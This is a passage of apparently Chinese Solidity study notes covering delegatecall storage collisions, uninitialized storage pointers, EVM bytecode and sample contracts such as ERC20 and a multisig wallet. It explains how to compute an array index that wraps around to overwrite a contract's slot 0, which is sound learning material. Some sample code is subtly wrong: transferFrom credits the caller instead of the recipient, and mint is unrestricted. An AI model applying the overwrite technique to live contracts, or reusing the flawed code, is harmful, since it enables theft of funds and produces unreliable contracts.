function_">Transfer</span><span class="params">(sender,recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">mint</span><span class="params">(uint amount)</span> external &#123;</span><br><span class="line">        balanceOf[msg.sender] += amount;</span><br><span class="line">        totalSupply += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, address(<span class="number">0</span>),amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">burn</span><span class="params">(uint amount)</span> external &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        totalSupply -= amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>),msg.sender,amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="调用delegatecall深入了解（call，callcode）"><a href="#调用delegatecall深入了解（call，callcode）" class="headerlink" title="调用delegatecall深入了解（call，callcode）"></a>调用delegatecall深入了解（call，callcode）</h2><p><strong>—call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。</strong><br><strong>-delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。</strong><br><strong>-callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。</strong></p><p><strong>要十分主义delegatecall这个危险函数</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">    address a;<span class="comment">//slot0</span></span><br><span class="line">    address b;<span class="comment">//slot1</span></span><br><span class="line">    address c;<span class="comment">//slot2</span></span><br><span class="line">&#125;</span><br><span class="line">contract B&#123;</span><br><span class="line">    address d;<span class="comment">//slot0</span></span><br><span class="line">    function <span class="title function_">change</span><span class="params">()</span>public&#123;</span><br><span class="line">    d=msg.sender;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>如果合约A通过delegatecall调用合约B中的change函数，那么在A的环境下会修改合约A中slot0槽中的变量</strong><br><strong>因为在B合约中d的位置是slot0</strong></p><h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p><strong>合约地址的生成是有规律可寻的。</strong><br><strong>经常可以看到有的通证或组织跨链部署的合约都是同样的，这是因为合约地址是根据创建者的地址及nonce来计算的，</strong><br><strong>两者先进行RLP编码再利用keccak256进行哈希计算，在最终的结果取后20个字节作为地址（哈希值原本为32字节）。</strong></p><h2 id="动态数组与映射"><a href="#动态数组与映射" class="headerlink" title="动态数组与映射"></a>动态数组与映射</h2><h2 id="动态数组"><a href="#动态数组" class="headerlink" title="动态数组"></a>动态数组</h2><p>设 bytes32[] codex为动态数组<br>1.若slot0存储的则是codex动态数组，更准确来说，应该是codex动态数组的长度，而具体的下标内容呢？<br>Storage Address 的由来 x=keccak_256(slot)+x slot 是指数组长度存储的位置，此处对应的就是 0，x对应的值就是数组下标<br>所以我们将插槽表示出来：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">await web3.utils.keccak256(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>)</span><br><span class="line">算出结果应该是<span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span></span><br><span class="line">代表数据的起始槽</span><br><span class="line">其实相当于数字 <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>这种意义</span><br><span class="line">max=<span class="number">115792089237316195423570985008687907853269984665640564039457584007913129639935</span></span><br><span class="line"><span class="number">2</span>**<span class="number">256</span><span class="number">-1</span><span class="number">-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>+<span class="number">1</span>=</span><br><span class="line"><span class="number">35707666377435648211887908874984608119992236509074197713628505308453184860938</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>2.若这个数组的length为2^256-1则这个数组包裹了所有的槽，既所有的槽都可以用数组表示<br>特别注意，数组的起始位置并不是0槽而是上面的一串字符，0槽里面只是数组长度<br>3.若我们想改变0槽的数据只需找到该槽的数组索引值既可<br>应该是2**256-1-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6+1。<br>同时任何槽都可以寻找索引<br>因为我们到达末端后需要再进一位产生上溢出，返回slot0的数组索引。<br>然后修改该索引的内容就可以覆盖原有槽中的数据从而篡改数据。</p><h2 id="映射·"><a href="#映射·" class="headerlink" title="映射·"></a>映射·</h2><p> 计算的规则是这样的，x=keccak_256(key+slot)<br>key 代表映射类型的关键字<br>slot 代表定义映射类型变量对应的插槽</p><h2 id="函数内部定义storage的问题"><a href="#函数内部定义storage的问题" class="headerlink" title="函数内部定义storage的问题"></a>函数内部定义storage的问题</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">   uint public o=<span class="number">8</span> ;</span><br><span class="line">   uint public c=<span class="number">0</span>;</span><br><span class="line">    function <span class="title function_">donate</span><span class="params">()</span> public  &#123;</span><br><span class="line">        uint[] storage x;</span><br><span class="line">        uint c=<span class="number">99</span>;</span><br><span class="line">        x.push(c);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>donate中定义了一个storag，从而在函数体内非显示初始化的时候会使用storage存储。<br>函数内：第一个储存的时数组长度，第二个是十万八千里的数据。<br>因为储存第一个是数组长度，又因为o=8，同时还push了一个数据，所以长度（o）变成8+1=9;</p><p>切记！！：结构体的声明是没有赋予储存空间的，这里的声名指的就是定义一个结构体类型的数据</p><h2 id="转账函数与报错回滚的知识点"><a href="#转账函数与报错回滚的知识点" class="headerlink" title="转账函数与报错回滚的知识点"></a>转账函数与报错回滚的知识点</h2><p>send、call和transfer之间的区别。</p><p>transfer如果异常会转账失败，并抛出异常，终止运行，存在gas限制<br>send如果异常会转账失败，返回false，不终止执行，存在gas限制<br>call如果异常会转账失败，返回false，不终止执行，没有gas限制</p><p>require()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">require()会返还剩余 gas，而且允许返回一个数值</span><br><span class="line"></span><br><span class="line">公式：</span><br><span class="line">require(condition, ‘Something bad happened’);</span><br><span class="line">在函数开头进行判断，不满足condition会返回定义值</span><br><span class="line"></span><br><span class="line">用途：</span><br><span class="line">require：最常用的检测关键字，用来验证输入参数和调用函数结果是否合法。</span><br><span class="line">验证用户输入，即： require(input&lt;<span class="number">20</span>);</span><br><span class="line">验证外部合约响应，即： require(external.send(amount));</span><br><span class="line">执行合约前，验证状态条件，即： require(block.number &gt; SOME_BLOCK_NUMBER) 或者 require(balance[msg.sender]&gt;=amount)</span><br><span class="line">一般地，尽量使用 require 函数</span><br><span class="line">一般地，require 应该在函数最开始的地方使用</span><br></pre></td></tr></table></figure></p><p>revert()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">revert()函数会返还剩余 gas，而且允许返回一个数值</span><br><span class="line"></span><br><span class="line">公式：</span><br><span class="line"><span class="keyword">if</span>(_data != data) &#123; revert(“require data is valid”); &#125;</span><br><span class="line">将剩余gas返还调用者</span><br><span class="line">用途：</span><br><span class="line">revert：适用在某个分支判断的场景下。</span><br><span class="line">处理与 require() 同样的类型，但是需要更复杂处理逻辑的场景</span><br></pre></td></tr></table></figure></p><p>assert()[所有gas]<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assert() 即使有错误，也会执行并扣除gas。</span><br><span class="line"></span><br><span class="line">公式：</span><br><span class="line">assert(_condition);</span><br><span class="line">不满足condition时执行</span><br><span class="line">用途：</span><br><span class="line">assert: 检查结果是否正确、合法，一般用于函数结尾</span><br><span class="line">检查内部错误和状态不变性</span><br><span class="line">检查 overflow/underflow，即：c = a+b; assert(c &gt; b)</span><br><span class="line">检查非变量（invariants），即：assert(this.balance &gt;= totalSupply);</span><br><span class="line">验证改变后的状态</span><br><span class="line">预防不应该发生的条件</span><br><span class="line">一般地，尽量少使用 assert 调用</span><br><span class="line">一般地，assert 应该在函数结尾处使用</span><br></pre></td></tr></table></figure><br>if···throw[所有gas]<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果 useSuperPowers() 函数被其它非拥有者调用，此函数将抛出“返回无效操作代码错误”，回滚所有状态改变，而且消耗掉剩下的gas.处理 throws 后会消耗剩余的 gas。尽管可以视为对矿工的慷慨捐助，但是往往会消耗用户大量金钱。</span><br><span class="line">contract HasAnOwner &#123;</span><br><span class="line">address owner;</span><br><span class="line">function <span class="title function_">useSuperPowers</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.sender != owner) &#123; throw; &#125;</span><br><span class="line"><span class="comment">// do something only the owner should be allowed to do</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="EVM指令"><a href="#EVM指令" class="headerlink" title="EVM指令"></a>EVM指令</h2><p>PUSH1(60)  03  指push一个字节</p><p>PUSH1    ??   60??    合约代码copy多少字节<br>PUSH1    00   6000     第几个字节copy<br>PUSH1    00   6000       copy到内存的位置<br>CODECOPY 39   39</p><p>PUSH1    ??   60??        需要返回数据的长度<br>PUSH1    00   6000          从内存中哪个位置开始读取<br>RETURN    F3<br>12个字节转为16<br>进制为0C所以??为0C<br>600C6000600039600C6000F3<br>0x600a600c602039600a6020f3602a60605260206060f3</p><h2 id="账户签名"><a href="#账户签名" class="headerlink" title="账户签名"></a>账户签名</h2><p>ethereum.request({method:”personal_sign”,params:[account,hash]}) 两次哈希签名方法</p><p>await web3.eth.sign(“0x901627bac315f6fadaed2159c5d18515afcbf61c7d9faea9353d34cffb1a64f2”,”0x001d3F1ef827552Ae1114027BD3ECF1f086bA0F9”)<br>[“消息哈希”，“账户地址”]<br>消息哈希：keccak256(abi.encodePacked(message))</p>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础知识点（三）</title>
      <link href="/2022/12/01/solidity/%EF%BC%88%E4%B8%89%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/12/01/solidity/%EF%BC%88%E4%B8%89%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity基础知识点（三）"><a href="#solidity基础知识点（三）" class="headerlink" title="solidity基础知识点（三）"></a>solidity基础知识点（三）</h1><h2 id="权限控制合约"><a href="#权限控制合约" class="headerlink" title="权限控制合约"></a>权限控制合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">contract AccessControl&#123;</span><br><span class="line">    event <span class="title function_">GrandRole</span><span class="params">(bytes32 indexed role,address indexed account)</span>;</span><br><span class="line">    event <span class="title function_">RevokeRole</span><span class="params">(bytes32 indexed role,address indexed account)</span>;</span><br><span class="line">    <span class="comment">//role=&gt;account=&gt;bool</span></span><br><span class="line">    mapping(bytes32 =&gt; mapping(address =&gt; <span class="type">bool</span>))public roles;</span><br><span class="line">    <span class="comment">//字符串的gas消耗比bytes32哈希的消耗要多的多</span></span><br><span class="line">    bytes32 private constant ADMIN=keccak256(abi.encodePacked(<span class="string">&quot;ADMIN&quot;</span>));</span><br><span class="line">    bytes32 private constant USER=keccak256(abi.encodePacked(<span class="string">&quot;USER&quot;</span>));</span><br><span class="line">    modifier <span class="title function_">onlyRole</span><span class="params">(bytes32 _role)</span>&#123;</span><br><span class="line">        require(roles[_role][msg.sender],<span class="string">&quot;not dauthorized&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    constructor()&#123;<span class="comment">//给其实账户管理员权限</span></span><br><span class="line">        _grandRole(ADMIN,msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    function _grandRole(bytes32 _role,address _account)internal&#123;<span class="comment">//_role为ADMIN与USER</span></span><br><span class="line">        roles[_role][_account]=<span class="literal">true</span>;<span class="comment">//内部给账户权力的源代码</span></span><br><span class="line">        emit <span class="title function_">GrandRole</span><span class="params">(_role,_account)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">grandRole</span><span class="params">(bytes32 _role,address _account)</span>external <span class="title function_">onlyRole</span><span class="params">(ADMIN)</span>&#123;</span><br><span class="line">        _grandRole(_role,_account);<span class="comment">//赋予账户权限</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">revokeRole</span><span class="params">(bytes32 _role,address _account)</span>external <span class="title function_">onlyRole</span><span class="params">(ADMIN)</span>&#123;</span><br><span class="line">        roles[_role][_account]=<span class="literal">false</span>;<span class="comment">//撤销账户权限</span></span><br><span class="line">        emit <span class="title function_">RevokeRole</span><span class="params">(_role,_account)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自毁函数"><a href="#自毁函数" class="headerlink" title="自毁函数"></a>自毁函数</h2><p><strong>可实现强制发送主币给地址</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract Kill&#123;</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">kill</span><span class="params">()</span>external&#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));<span class="comment">//必须以payable标记的地址</span></span><br><span class="line">        &#125;</span><br><span class="line">        function <span class="title function_">testCall</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Helper&#123;<span class="comment">//通过这个合约来调用自毁合约</span></span><br><span class="line">    function <span class="title function_">getBalance</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">kill</span><span class="params">(Kill _kill)</span>external&#123;</span><br><span class="line">        _kill.kill();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="小猪存钱罐"><a href="#小猪存钱罐" class="headerlink" title="小猪存钱罐"></a>小猪存钱罐</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract PiggyBank&#123;</span><br><span class="line">    event <span class="title function_">Deposit</span><span class="params">(uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Withdraw</span><span class="params">(uint amount)</span>;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    receive()external payable&#123;</span><br><span class="line">        emit <span class="title function_">Deposit</span><span class="params">(msg.value)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">()</span>external &#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        emit <span class="title function_">Withdraw</span><span class="params">(address(this).balance)</span>;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">interface IERC20&#123;</span><br><span class="line">    function <span class="title function_">totalSupply</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;<span class="comment">//代表token总量</span></span><br><span class="line">    function <span class="title function_">balanceOf</span><span class="params">(address account)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;<span class="comment">//代表某一账户的余额</span></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;<span class="comment">//由当前调用者发送</span></span><br><span class="line">    function <span class="title function_">allowance</span><span class="params">(address owner,address spender)</span><span class="comment">//查看批准额度</span></span><br><span class="line">        external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;<span class="comment">//批准账户额度</span></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address sender,address recipient,uint amount)</span></span><br><span class="line">        external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from,address indexed to,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Approval</span><span class="params">(address indexed owner,address indexed spender,uint amount)</span>;</span><br><span class="line">&#125;</span><br><span class="line">contract ERC20 is IERC20&#123;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">    mapping(address =&gt;uint)public balanceOf;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;uint))public allowance;</span><br><span class="line">    <span class="built_in">string</span> public name=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">    uint public decimals=<span class="number">18</span>;</span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient,uint amount )</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        balanceOf[msg.sender]-=amount;</span><br><span class="line">        balanceOf[recipient]+=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender,recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        allowance[msg.sender][spender]=amount;</span><br><span class="line">        emit <span class="title function_">Approval</span><span class="params">(msg.sender,spender,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address sender,address recipient,uint amount)</span></span><br><span class="line">        external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">            allowance[sender][msg.sender]-=amount;</span><br><span class="line">            balanceOf[sender]-=amount;</span><br><span class="line">            balanceOf[msg.sender]+=amount;</span><br><span class="line">            emit <span class="title function_">Transfer</span><span class="params">(sender,recipient,amount)</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">mint</span><span class="params">(uint amount)</span>external&#123;</span><br><span class="line">        balanceOf[msg.sender]+=amount;</span><br><span class="line">        totalSupply+=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>),msg.sender,amount)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    function <span class="title function_">burn</span><span class="params">(uint amount)</span>external&#123;</span><br><span class="line">        balanceOf[msg.sender]-=amount;</span><br><span class="line">        totalSupply-=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender,address(<span class="number">0</span>),amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多签钱包"><a href="#多签钱包" class="headerlink" title="多签钱包"></a>多签钱包</h2><p><strong>多个人同意之后才能转账</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">contract MultiSigWallet&#123;</span><br><span class="line">    event <span class="title function_">Deposit</span><span class="params">(address indexed sender,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Submit</span><span class="params">(uint indexed txId)</span>;<span class="comment">//提交交易申请,txId表示交易数组的索引</span></span><br><span class="line">    event <span class="title function_">Approve</span><span class="params">(address indexed owner,uint indexed txId)</span>;<span class="comment">//多次批准</span></span><br><span class="line">    event <span class="title function_">Revoke</span><span class="params">(address indexed owner,uint indexed txId)</span>;<span class="comment">//撤销批准</span></span><br><span class="line">    event <span class="title function_">Execute</span><span class="params">(uint indexed txId)</span>;<span class="comment">//执行</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Transaction</span>&#123;</span><span class="comment">//交易的数据</span></span><br><span class="line">        address to;</span><br><span class="line">        uint value;</span><br><span class="line">        bytes data;</span><br><span class="line">        <span class="type">bool</span> executed;<span class="comment">//是否被执行过</span></span><br><span class="line">    &#125;</span><br><span class="line">    address[]public owners;</span><br><span class="line">    mapping(address=&gt;<span class="type">bool</span>)public isOwner;</span><br><span class="line">    uint public required;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span><span class="params">()</span>&#123;</span><br><span class="line">        require(isOwner[msg.sender],<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">txExists</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该交易id是否存在，需要存在</span></span><br><span class="line">        require(_txId&lt;transactions.length,<span class="string">&quot;tx does not exist&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">notApproved</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该批准人是否已经批准，需未批准</span></span><br><span class="line">        require(!approved[_txId][msg.sender],<span class="string">&quot;tx already approved&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">notExecuted</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该交易是否被执行过，需要未交易</span></span><br><span class="line">        require(!transactions[_txId].executed,<span class="string">&quot;tx already executed&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Transaction[]public transactions;<span class="comment">//记录所有交易</span></span><br><span class="line">    <span class="comment">//某一个交易id下某一个签名人的地址是否批准这次交易</span></span><br><span class="line"></span><br><span class="line">    mapping(uint =&gt;mapping(address=&gt;<span class="type">bool</span>))public approved;</span><br><span class="line"></span><br><span class="line">    constructor(address[]memory _owners,uint _required)&#123;</span><br><span class="line">        require(_owners.length&gt;<span class="number">0</span>,<span class="string">&quot;owners required&quot;</span>);<span class="comment">//人的个数要大于零</span></span><br><span class="line">        <span class="comment">//最少批准人的个数大于零，且小于总人数</span></span><br><span class="line">        require(_required&gt;<span class="number">0</span>&amp;&amp;_required&lt;=_owners.length,<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint 